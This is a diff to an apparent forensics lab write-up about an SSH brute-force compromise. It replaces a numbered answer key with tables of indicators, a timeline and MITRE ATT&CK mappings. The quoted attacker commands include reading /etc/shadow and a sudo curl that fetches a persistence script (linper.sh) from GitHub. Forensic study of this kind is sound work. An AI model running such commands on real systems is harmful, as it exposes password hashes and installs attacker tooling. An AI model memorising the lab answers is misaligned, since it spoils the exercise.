@@ -89,6 +89,7 @@ reboot   system boot  6.2.0-1017-aws   Thu Jan 25 11:12:17 2024 - Sun Feb 11 11:
 wtmp begins Thu Jan 25 11:12:17 2024
 ```
 
+Below is a snippet of auth.log around the session end and follow-on activity.
 Command
 ```
 grep 06:37 auth.log
@@ -187,22 +188,36 @@ Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for
 Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
 ```
 
-Answers
-1. Brute force IP. 65.2.161.68
-2. Compromised account. root
-3. Interactive login time UTC. 2024-03-06 06:32:45
-4. Session number. 37
-5. Persistence account. cyberjunkie
-6. MITRE ATT&CK sub technique. T1136.001
-7. First SSH session end time UTC. 2024-03-06 06:37:24
-8. Sudo command. /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+Findings and indicators
 
-Timeline
-2024-03-06 06:31:33 UTC. Brute force failures from 65.2.161.68.
-2024-03-06 06:32:44 UTC. Root authentication accepted.
-2024-03-06 06:32:45 UTC. Root session starts in wtmp.
-2024-03-06 06:34:18 UTC. useradd creates cyberjunkie.
-2024-03-06 06:37:24 UTC. Session 37 closes.
-2024-03-06 06:37:34 UTC. cyberjunkie login.
-2024-03-06 06:37:57 UTC. sudo cat /etc/shadow.
-2024-03-06 06:39:38 UTC. sudo curl pulls linper.sh.
+| Type | Value | Context |
+| --- | --- | --- |
+| Attacker IP | 65.2.161.68 | Source of brute force attempts |
+| Compromised user | root | Account successfully accessed |
+| Persistence user | cyberjunkie | Rogue account created by attacker, UID 1002 |
+| Malicious file | linper.sh | Enumeration script fetched with curl |
+| Session ID | 37 | Interactive root session in systemd-logind |
+| Initial login | 2024-03-06 06:32:45 UTC | Interactive session start in wtmp |
+| Session end | 2024-03-06 06:37:24 UTC | Root session closed in auth.log |
+
+Forensic timeline UTC
+
+| Timestamp | Event | Technical detail |
+| --- | --- | --- |
+| 06:31:33 | Brute force | Failed logins from 65.2.161.68 |
+| 06:32:44 | Compromise | Accepted password for root |
+| 06:32:45 | Interactive session | Root session starts in wtmp |
+| 06:34:18 | Persistence | useradd creates cyberjunkie |
+| 06:35:15 | Privilege change | usermod adds cyberjunkie to sudo |
+| 06:37:24 | Session end | Session 37 closed |
+| 06:37:57 | Credential access | sudo cat /etc/shadow |
+| 06:39:38 | Tool transfer | sudo curl downloads linper.sh |
+
+MITRE ATT&CK mapping
+
+| Technique | ID | Evidence | Note |
+| --- | --- | --- | --- |
+| Create Account | T1136.001 | useradd cyberjunkie | Persistence via local account |
+| Account Manipulation | T1098 | usermod adds sudo | Maintains admin access |
+| OS Credential Dumping | T1003.008 | sudo cat /etc/shadow | Hash access with root |
+| Ingress Tool Transfer | T1105 | curl linper.sh | Brings tooling for discovery |
